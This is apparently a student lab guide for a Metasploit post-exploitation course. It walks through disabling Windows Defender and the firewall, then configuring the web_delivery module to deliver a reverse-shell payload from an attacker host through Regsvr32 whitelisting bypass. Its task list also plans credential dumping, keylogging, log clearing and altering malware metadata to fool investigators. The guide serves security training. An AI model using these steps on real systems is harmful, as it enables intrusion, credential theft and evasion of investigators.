In this lab, students will apply the concepts in the fourth video series called _Post-Exploitataton, Command-and-Control, and SOCKS proxying with Metasploit_ and perform the following tasks

- We will create malware using msfvenom
- Host the malware using Metasploit's "web_delivery" module and python "http.server" modules.
- Execute the malware on our Windows target to establish a reverse shell
- Upgrade our basic reverse shell to the versatile Meterpreter payload for command-and-control
- Use process migration to move to a more stable process that isn't likely to be closed by the victim.
- Use the Meterpreter to load additional functionality such as the Mimikatz
- Investigate manual and automatic privilege escalation opportunities
- Harvest credentials via dumping the local Security Account Manager (SAM) to retrieve password representations (hashes)
- Capture keystrokes to collect passwords
- Take screenshots
- Upload and download files
- Clear event logs
- Modify malware metadata to fool investigators
# Configure the Metasploit database

We configure the database in this lab because during post-exploitation, pentesters often compromise accounts, capture credentials and password representations (hashes), and storing them in the database keeps everything organized.

First login as _ROOT_ and create the file, using the following command:
`nano start_database.sh

Next, add the following commands to the file:

`service postgresql start msfdb reinit cp /usr/share/metasploit-framework/config/database.yml /root/.msf4/ service postgresql restart msfconsole`

Set the executable permission on the script and if the command is successful, run the database script.
`chmod +x start_database.sh && ./start_database.sh

Enable Metasploit console logging to capture all the input and output to the /root/console.log file by running the "spool" command along with the path and name of the file to save the output to.
`spool /root/console.log
# Configure the Windows Server

Navigate to the _Windows server machine_.

Next, we will make some changes to the Windows Server to make sure our Lab runs smoothly.

To log in as an administrator on Windows Server, click the Windows icon in the bottom left corner, then go to the user settings. Change the user to the _Administrator_ account and enter the default password, _123456_.

Check if _Windows Defender Anti-Virus_ is disabled.

Click on the Windows icon in the bottom left-hand corner and type _virus and threat protection_. Then, click on _Manage Settings_. Finally, click on _Real-time protection_ and turn it _OFF_ if needed.
Next, open _powershell.exe_.

To disable the Windows defender firewall, enter:
`netsh advfirewall set allprofiles state off

Next, let's set the windows _administrator_ password by typing the following command:
`net user Administrator Password12345
# Load the web_delivery module

Switch back to the _Kali VM machine_.

Since we will be creating some Windows 64-bit malware, we need a way to host it on the network and have the target machine download it. Metasploit has a useful module called the _web_delivery_ module that does just that.

Let's use the _web_delivery_ module _to host and deliver the malware_ on the network so the Windows target can access it.

Start by loading the module, by using the following command:
`use exploit/multi/script/web_delivery
### Configure the web_delivery module

Next, let's set the options for our _web_delivery_ module.
`set LHOST eth0

The URIPATH option is the URL that the victim will visit. If you set the URIPATH to _/admin/login/_ then the attacker would visit the URL` http://attacker.com/admin/login/`. Lets set this to / for now to keep things simple.
`set URIPATH /

Since the default payload does not work with the _web_delivery_ module, we will use a simple Windows reverse shell for now.
`set PAYLOAD windows/x64/shell/reverse_tcp

Next, let's take a look at the available TARGET options.
`show targets

Let's use the Regsvr32 target option to 3.
`set TARGET 3

Regsvr32.exe is often used by attackers and penetration testers to bypass application whitelisting, where only approved programs are permitted to run. Regsvr32.exe is an approved Microsoft binary and can be used to execute the code of an attacker's choosing.

Confirm you set the target correctly by typing _options_. It should list the target as Regsvr32.

Finally, type the following command to launch the module.

run

> Verify the IP address configured for the listener.

---

What port does the module use to listen for incoming connections?